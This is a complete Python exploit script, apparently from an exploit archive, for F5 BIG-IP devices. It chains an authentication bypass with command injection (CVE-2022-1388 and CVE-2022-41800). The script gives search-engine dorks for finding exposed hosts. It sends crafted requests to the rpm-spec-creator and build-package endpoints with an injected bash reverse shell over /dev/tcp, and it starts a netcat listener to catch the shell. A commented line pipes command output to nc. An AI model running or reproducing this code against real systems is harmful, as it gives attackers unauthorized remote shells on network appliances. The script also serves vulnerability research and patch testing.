# Exploit Title: F5 BIG-IP Auth Bypass and Command Injection  (CVE-2022-1388 & CVE-2022-41800)
# Shodan Dork: title:"BIG-IP" html:"Configuration Utility" +"Server" -"(Ubuntu)"
# Censys Dork: services.software.product=`IP Configuration Utility`
# GreyNoise Dork: raw_data.web.paths:"/mgmt/shared/iapp/rpm-spec-creator"
# Date: April 13, 2023
# Exploit Author: Jacob Baines @ VulnCheck
# Tested on: BIG-IP version 16.1.2.1 - December 22, 2021
# CVE: CVE-2022-1388, CVE-2022-41800

import argparse
import requests
import urllib3
import time
import json
import sys
import os
import string
import random
urllib3.disable_warnings()


def do_banner():
    print("")
    print("   ▄▄▄▄▄▪   ▄▄▄· ▄▄▄· ▄▄▄·     • ▌ ▄ ·.  ▄· ▄")
    print("   •██  ██ ▐█ ▄█▐█ ▄█▐█ ▀█     ·██ ▐███▪▐█▪██")
    print("    ▐█.▪▐█· ██▀· ██▀·▄█▀▀█     ▐█ ▌▐▌▐█·▐█▌▐█▪")
    print("    ▐█▌·▐█▌▐█▪·•▐█▪·•▐█ ▪▐▌    ██ ██▌▐█▌ ▐█▀·.")
    print("    ▀▀▀ ▀▀▀.▀   .▀    ▀  ▀     ▀▀  █▪▀▀▀  ▀ • ")
    print("         ▄▄▄▄▄       ▐ ▄  ▄▄ • ▄• ▄▌▄▄▄ .     ")
    print("         •██  ▪     •█▌▐█▐█ ▀ ▪█▪██▌▀▄.▀·     ")
    print("          ▐█.▪ ▄█▀▄ ▐█▐▐▌▄█ ▀█▄█▌▐█▌▐▀▀▪▄     ")
    print("          ▐█▌·▐█▌.▐▌██▐█▌▐█▄▪▐█▐█▄█▌▐█▄▄▌     ")
    print("          ▀▀▀  ▀█▄▀▪▀▀ █▪·▀▀▀▀  ▀▀▀  ▀▀▀      ")
    print("")
    print("                 CVE-2022-1388                ")
    print("                 CVE-2022-41800               ")
    print("")
    print("                       🦞                     ")
    print("")


if __name__ == "__main__":

    do_banner()

    parser = argparse.ArgumentParser(description='F5 BIG-IP Auth Bypass and Command Injection (CVE-2022-1388 & CVE-2022-41800)')
    parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The remote address to exploit")
    parser.add_argument('--rport', action="store", dest="rport", type=int, help="The remote port to exploit", default="443")
    parser.add_argument('--lhost', action="store", dest="lhost", required=True, help="The local address to connect back to")
    parser.add_argument('--lport', action="store", dest="lport", type=int, help="The local port to connect back to", default="1270")
    parser.add_argument('--protocol', action="store", dest="protocol", help="The protocol handler to use", default="https://")
    parser.add_argument('--nc-path', action="store", dest="ncpath", help="The path to nc", default="/usr/bin/nc")
    args = parser.parse_args()

    pid = os.fork()
    if pid == 0:
        time.sleep(1)
        bash_exploit = "bash -c 'exec bash -i &>/dev/tcp/" + args.lhost + '/' + str(args.lport) + " <&1';"
        #bash_exploit = "id | nc " + args.lhost + " 1271"
        appName = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))

        payload = {
            "specFileData": {
                "name": appName,
                "srcBasePath": "/tmp",
                "version": "".join(random.choices(string.ascii_lowercase + string.digits, k=6)),
                "release": "".join(random.choices(string.ascii_lowercase + string.digits, k=6)),
                # https://rpm-packaging-guide.github.io/ - see "%check"
                "description": "%check\n" + bash_exploit,
                "summary": "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
            }
        }

        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Referer': args.protocol + args.rhost + ":" + str(args.rport),
            'Connection': 'close, X-Forwarded-Host, X-F5-Auth-Token',
            'X-F5-Auth-Token': "".join(random.choices(string.ascii_lowercase + string.digits, k=8)),
            'Authorization': 'Basic YWRtaW468J+mng=='
        }

        url = args.protocol + args.rhost + ":" + str(args.rport) + "/mgmt/shared/iapp/rpm-spec-creator"
        print("[+] Sending initial request to rpm-spec-creator")
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=5)
        if r.status_code != 200:
            print('[-] Exploitation failed.')
            sys.exit(0)

        create_json = json.loads(r.text)
        if "specFilePath" not in create_json:
            print("[-] Missing path. Exploit failed")
            sys.exit(0)

        payload = {
            "state": {},
            "appName": appName,
            "packageDirectory": "/tmp",
            "specFilePath": create_json["specFilePath"],
            "force": True
        }

        url = args.protocol + args.rhost + ":" + str(args.rport) + "/mgmt/shared/iapp/build-package"
        print("[+] Sending exploit attempt request to build-package")
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=5)

        package_json = json.loads(r.text)
        if "step" not in package_json:
            print('[-] Exploitation failed.')
            sys.exit(0)
    else:
        print('[+] Executing netcat listener')
        print('[+] Using ' + args.ncpath)
        os.execv(args.ncpath, [args.ncpath, '-lvnp ' + str(args.lport)])
